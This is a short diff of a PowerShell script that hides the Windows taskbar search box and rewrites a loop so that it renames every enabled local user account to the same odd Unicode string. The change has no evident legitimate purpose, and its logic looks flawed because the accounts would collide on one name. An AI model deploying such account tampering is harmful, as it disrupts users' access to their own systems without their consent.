@@ -42,12 +42,11 @@ $searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
 New-Item -Path $searchBarPath -Force | Out-Null
 Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
 
-# Change user account names
-$accounts = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'"
-
-foreach ($account in $accounts) {
+# Change the user account names
+$users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
+foreach ($user in $users) {
     $newName = "⓿⌓⓿"
-    $account.Rename($newName)
+    Rename-LocalUser -Name $user.Name -NewName $newName
 }
 
 $source = @"
